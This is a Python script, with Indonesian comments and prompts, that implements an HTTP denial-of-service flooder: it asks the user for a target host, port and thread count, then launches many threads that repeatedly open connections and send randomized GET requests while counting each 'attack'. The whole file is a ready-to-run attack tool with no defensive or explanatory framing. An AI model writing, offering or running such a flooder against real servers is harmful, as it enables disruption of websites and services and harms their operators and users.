import socket
import threading
import time
import random
from datetime import datetime

class HTTPDoSAttack:
    def __init__(self, target_host, target_port=80, num_threads=100):
        self.target_host = target_host
        self.target_port = target_port
        self.num_threads = num_threads
        self.attack_count = 0
        self.is_running = True
        self.lock = threading.Lock()

    def mulai_serangan(self):
        print(f"Memulai serangan DoS ke {self.target_host}:{self.target_port}")
        threads = []
        
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.serang)
            thread.start()
            threads.append(thread)
            
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nMenghentikan serangan...")
            self.is_running = False
            for thread in threads:
                thread.join()

    def serang(self):
        while self.is_running:
            try:
                # Membuat socket baru untuk setiap request
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target_host, self.target_port))
                
                # Membuat HTTP request
                payload = f"GET /{random.randint(1,1000)} HTTP/1.1\r\n"
                payload += f"Host: {self.target_host}\r\n"
                payload += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                payload += "Accept: text/html,application/xhtml+xml\r\n"
                payload += "Connection: keep-alive\r\n\r\n"
                
                s.send(payload.encode())
                
                with self.lock:
                    self.attack_count += 1
                    if self.attack_count % 500 == 0:
                        waktu = datetime.now().strftime("%H:%M:%S")
                        print(f"[{waktu}] Total serangan: {self.attack_count}")
                
                s.close()
                
            except Exception as e:
                print(f"Kesalahan: {str(e)}")
                time.sleep(2)
                continue
            
            # Delay kecil untuk menghindari overload pada sistem
            time.sleep(0.1)

# Contoh penggunaan:
if __name__ == "__main__":
    target = input("Masukkan alamat target: ")
    port = int(input("Masukkan port (default 80): ") or 80)
    threads = int(input("Masukkan jumlah thread (default 100): ") or 100)
    
    attack = HTTPDoSAttack(target, port, threads)
    attack.mulai_serangan()
